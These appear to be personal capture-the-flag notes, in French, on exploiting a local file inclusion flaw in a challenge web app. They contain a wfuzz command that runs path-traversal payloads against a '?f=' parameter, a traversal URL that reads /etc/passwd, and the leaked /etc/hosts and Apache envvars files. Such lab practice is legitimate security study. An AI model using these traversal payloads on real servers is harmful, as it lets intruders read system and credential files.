wfuzz -c --hw 3736 -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://138.68.151.248:31012/?f=../../../../../../../FUZZ

Il y a une LFI ici : http://138.68.178.56:31681/?f=../../../../../../..//etc/passwd ( reponse dans le code source (CTRL+U) )
et j'ai trouver une erreur chelou ici : http://138.68.178.56:31681/?f=../send.php ( il faut  scroll down)

```
Kubernetes-managed hosts file.
127.0.0.1    localhost
::1    localhost ip6-localhost ip6-loopback
fe00::0    ip6-localnet
fe00::0    ip6-mcastprefix
fe00::1    ip6-allnodes
fe00::2    ip6-allrouters
10.244.20.193    webcaextortion-5797-847486786c-hfd9w
```

```
# envvars - default environment variables for apache2ctl

# this won't be correct after changing uid
unset HOME

# for supporting multiple apache2 instances
if [ "${APACHE_CONFDIR##/etc/apache2-}" != "${APACHE_CONFDIR}" ] ; then
    SUFFIX="-${APACHE_CONFDIR##/etc/apache2-}"
else
    SUFFIX=
fi

# Since there is no sane way to get the parsed apache2 config in scripts, some
# settings are defined via environment variables and then used in apache2ctl,
# /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.
: ${APACHE_RUN_USER:=www-data}
export APACHE_RUN_USER
: ${APACHE_RUN_GROUP:=www-data}
export APACHE_RUN_GROUP
# temporary state file location. This might be changed to /run in Wheezy+1
: ${APACHE_PID_FILE:=/var/run/apache2$SUFFIX/apache2.pid}
export APACHE_PID_FILE
: ${APACHE_RUN_DIR:=/var/run/apache2$SUFFIX}
export APACHE_RUN_DIR
: ${APACHE_LOCK_DIR:=/var/lock/apache2$SUFFIX}
export APACHE_LOCK_DIR
# Only /var/log/apache2 is handled by /etc/logrotate.d/apache2.
: ${APACHE_LOG_DIR:=/var/log/apache2$SUFFIX}
export APACHE_LOG_DIR

## The locale used by some modules like mod_dav
: ${LANG:=C}
export LANG
## Uncomment the following line to use the system default locale instead:
#. /etc/default/locale

export LANG

## The command to get the status for 'apache2ctl status'.
## Some packages providing 'www-browser' need '--dump' instead of '-dump'.
#export APACHE_LYNX='www-browser -dump'

## If you need a higher file descriptor limit, uncomment and adjust the
## following line (default is 8192):
#APACHE_ULIMIT_MAX_FILES='ulimit -n 65536'

## If you would like to pass arguments to the web server, add them below
## to the APACHE_ARGUMENTS environment.
#export APACHE_ARGUMENTS=''

## Enable the debug mode for maintainer scripts.
## This will produce a verbose output on package installations of web server modules and web application
## installations which interact with Apache
#export APACHE2_MAINTSCRIPT_DEBUG=1
"), /*#__PURE__*/
```